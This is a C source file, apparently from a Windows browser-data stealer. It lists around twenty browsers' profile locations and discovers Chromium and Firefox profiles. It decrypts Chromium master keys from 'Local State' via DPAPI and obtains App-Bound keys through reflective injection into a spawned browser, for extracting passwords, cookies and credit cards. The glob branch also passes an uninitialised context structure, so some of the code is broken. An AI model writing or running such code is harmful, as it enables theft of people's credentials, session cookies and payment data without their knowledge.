/* bd_browsers.c - browser registry (mirrors browser/consts.go + browser_windows.go),
 * profile discovery, Local State master-key loading. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memset(void *, int, size_t);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);
extern int    _strnicmp(const char *, const char *, size_t);
extern char  *strchr(const char *, int);
extern char  *getenv(const char *);

/* ---------------------------------------------------------- browser table -- */
static const bd_browser_t g_browsers[] = {
    { "chrome",      "Chrome",           "Google\\Chrome\\User Data",                    "LOCALAPPDATA", BD_KIND_CHROMIUM,  1 },
    { "edge",        "Microsoft Edge",   "Microsoft\\Edge\\User Data",                   "LOCALAPPDATA", BD_KIND_CHROMIUM,  1 },
    { "chromium",    "Chromium",         "Chromium\\User Data",                          "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "chrome-beta", "Chrome Beta",      "Google\\Chrome Beta\\User Data",               "LOCALAPPDATA", BD_KIND_CHROMIUM,  1 },
    { "opera",       "Opera",            "Opera Software\\Opera Stable",                 "APPDATA",      BD_KIND_CHROMIUM_OPERA, 0 },
    { "opera-gx",    "OperaGX",          "Opera Software\\Opera GX Stable",              "APPDATA",      BD_KIND_CHROMIUM_OPERA, 0 },
    { "vought",      "Browser from Vought","Browser from Vought",                        "APPDATA",      BD_KIND_CHROMIUM_OPERA, 0 },
    { "vivaldi",     "Vivaldi",          "Vivaldi\\User Data",                           "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "coccoc",      "CocCoc",           "CocCoc\\Browser\\User Data",                   "LOCALAPPDATA", BD_KIND_CHROMIUM,  1 },
    { "brave",       "Brave",            "BraveSoftware\\Brave-Browser\\User Data",      "LOCALAPPDATA", BD_KIND_CHROMIUM,  1 },
    { "yandex",      "Yandex",           "Yandex\\YandexBrowser\\User Data",             "LOCALAPPDATA", BD_KIND_CHROMIUM_YANDEX, 0 },
    { "360x",        "360 Speed X",      "360ChromeX\\Chrome\\User Data",                "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "360",         "360 Speed",        "360chrome\\Chrome\\User Data",                 "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "qq",          "QQ",               "Tencent\\QQBrowser\\User Data",                "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "dc",          "DC",               "DCBrowser\\User Data",                         "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "sogou",       "Sogou",            "Sogou\\SogouExplorer\\User Data",              "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "arc",         "Arc",              "Packages\\TheBrowserCompany.Arc_*/LocalCache/Local/Arc/User Data",
                                                                                         "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "duckduckgo",  "DuckDuckGo",       "Packages\\DuckDuckGo.DesktopBrowser_*/LocalState/EBWebView",
                                                                                         "LOCALAPPDATA", BD_KIND_CHROMIUM,  0 },
    { "firefox",     "Firefox",          "Mozilla\\Firefox\\Profiles",                   "APPDATA",      BD_KIND_FIREFOX,   0 },
};

int bd_browser_count(void) { return (int)(sizeof(g_browsers) / sizeof(g_browsers[0])); }
const bd_browser_t *bd_browser_at(int i) {
    if (i < 0 || i >= bd_browser_count()) return NULL;
    return &g_browsers[i];
}
const bd_browser_t *bd_browser_find(const char *key) {
    int i;
    if (!key) return NULL;
    for (i = 0; i < bd_browser_count(); i++)
        if (bd_str_ieq(g_browsers[i].key, key)) return &g_browsers[i];
    return NULL;
}
const char *bd_cat_name(int cat) {
    switch (cat) {
    case BD_CAT_PASSWORDS:   return "passwords";
    case BD_CAT_COOKIES:     return "cookies";
    case BD_CAT_HISTORY:     return "history";
    case BD_CAT_DOWNLOADS:   return "downloads";
    case BD_CAT_CREDITCARDS: return "creditcards";
    case BD_CAT_BOOKMARKS:   return "bookmarks";
    }
    return "unknown";
}

/* -------------------------------------------------------------- discovery -- */
typedef struct {
    const bd_browser_t *br;
    char  base[600];
    void (*emit)(void *ctx, const char *profileDir);
    void *ctx;
} profctx;

static int prof_dir_exists(const char *p, void *ctx) {
    profctx *pc = (profctx *)ctx;
    (void)p;
    if (bd_dir_exists(pc->base)) pc->emit(pc->ctx, pc->base);
    return 0;
}

static int is_chromium_profile_dir(const char *name) {
    /* "Default", "Profile 1", "Profile 2", ... */
    if (bd_str_ieq(name, "Default")) return 1;
    if (_strnicmp(name, "Profile ", 8) == 0) {
        const char *p = name + 8;
        int digits = 0;
        while (*p) { if (*p < '0' || *p > '9') return 0; digits++; p++; }
        return digits > 0;
    }
    return 0;
}

static void find_profiles(const bd_browser_t *br, const char *userDataDir,
                          void (*emit)(void *ctx, const char *profileDir), void *ctx) {
    char path[600];
    WIN32_FIND_DATAA fd;
    HANDLE h;

    if (br->kind == BD_KIND_CHROMIUM_OPERA) {
        emit(ctx, userDataDir);          /* flat layout */
        return;
    }
    if (br->kind == BD_KIND_FIREFOX) {
        /* every subdir is a profile */
        _snprintf(path, sizeof(path), "%s\\*.*", userDataDir);
        h = FindFirstFileA(path, &fd);
        if (h == INVALID_HANDLE_VALUE) return;
        do {
            char sub[600];
            if (fd.cFileName[0] == '.') continue;
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (!bd_path_join(sub, sizeof(sub), userDataDir, fd.cFileName)) continue;
            emit(ctx, sub);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
        return;
    }
    /* Chromium: scan for Default / Profile N subdirs */
    _snprintf(path, sizeof(path), "%s\\*.*", userDataDir);
    h = FindFirstFileA(path, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        char sub[600];
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (!is_chromium_profile_dir(fd.cFileName)) continue;
        if (!bd_path_join(sub, sizeof(sub), userDataDir, fd.cFileName)) continue;
        emit(ctx, sub);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

/* iterate all user-data roots of a browser (supports one '*' component) and
 * run cb(profileDir) for every discovered profile */
void bd_for_each_profile(const bd_browser_t *br,
                         int (*cb)(void *ctx, const char *profileDir), void *ctx) {
    char base[600];
    const char *env = getenv(br->baseEnv);
    profctx pc;

    if (!env) return;
    if (!_snprintf(base, sizeof(base), "%s\\%s", env, br->userDir)) return;

    if (strchr(base, '*')) {
        bd_glob1(base, prof_dir_exists, &pc);
        return;
    }
    if (!bd_dir_exists(base)) return;
    find_profiles(br, base, (void (*)(void *, const char *))cb, ctx);
}

/* ---------------------------------------------------- master key loading -- */
static void load_local_state_keys(const char *browserKey, const char *profileDir, bd_keys_t *keys) {
    /* Local State lives one level above the profile dir (Chromium), except
     * Opera-flat where it's inside the profile dir itself. Try both. */
    char ls1[700], ls2[700];
    char *lsPath = ls1;
    char *data = NULL; size_t len = 0;
    bd_json *j;
    const bd_json *ek;

    keys->have_localstate = 0;
    if (!bd_path_join(ls1, sizeof(ls1), profileDir, "Local State")) return;
    if (bd_read_file(ls1, &data, &len) != 0) {
        /* profileDir = <userData>\<profile> -> parent */
        char parent[600], *cut;
        _snprintf(parent, sizeof(parent), "%s", profileDir);
        cut = parent + strlen(parent);
        while (cut > parent && *cut != '\\' && *cut != '/') cut--;
        if (cut == parent) return;
        *cut = 0;
        if (!bd_path_join(ls2, sizeof(ls2), parent, "Local State")) return;
        if (bd_read_file(ls2, &data, &len) != 0) return;
        lsPath = ls2;
    }
    j = bd_json_parse(data, len);
    free(data);
    if (!j) return;

    ek = bd_json_path(j, "os_crypt.encrypted_key");
    if (ek && bd_json_str(ek)) {
        unsigned char *raw = NULL; size_t rawlen = 0;
        if (bd_base64_decode(bd_json_str(ek), strlen(bd_json_str(ek)), &raw, &rawlen) == 0 &&
            rawlen > 5 && memcmp(raw, "DPAPI", 5) == 0) {
            unsigned char *pt = NULL; size_t ptlen = 0;
            if (bd_dpapi_decrypt(raw + 5, rawlen - 5, &pt, &ptlen) == 0 && pt && ptlen) {
                size_t take = ptlen > 32 ? 32 : ptlen;
                memcpy(keys->v10, pt, take);
                keys->v10len = (int)take;
                bd_local_free((unsigned long)(size_t)pt);
                keys->have_localstate = 1;
            }
        }
        if (raw) free(raw);
    }
    /* v20 (App-Bound): retrieve via reflective injection into the browser. */
    {
        const bd_browser_t *br = bd_browser_find(browserKey);
        if (br && br->abe && bd_abe_get_key(browserKey, lsPath, keys->v20) == 0)
            keys->v20len = 32;
    }
    bd_json_free(j);
}

void bd_load_chromium_keys(const char *browserKey, const char *profileDir, bd_keys_t *keys) {
    /* Memoize: the ABE injection is expensive (spawns a suspended browser),
     * and one profile triggers it from up to 3 categories. Cache by profile. */
    static char cached[700];
    static bd_keys_t cached_keys;
    static int cached_valid = 0;
    if (cached_valid && strlen(cached) == strlen(profileDir) &&
        memcmp(cached, profileDir, strlen(profileDir)) == 0) {
        *keys = cached_keys;
        return;
    }
    memset(keys, 0, sizeof(*keys));
    load_local_state_keys(browserKey, profileDir, keys);
    cached_keys = *keys;
    cached_valid = 1;
    {
        size_t n = strlen(profileDir);
        if (n >= sizeof(cached)) n = sizeof(cached) - 1;
        memcpy(cached, profileDir, n); cached[n] = 0;
    }
}
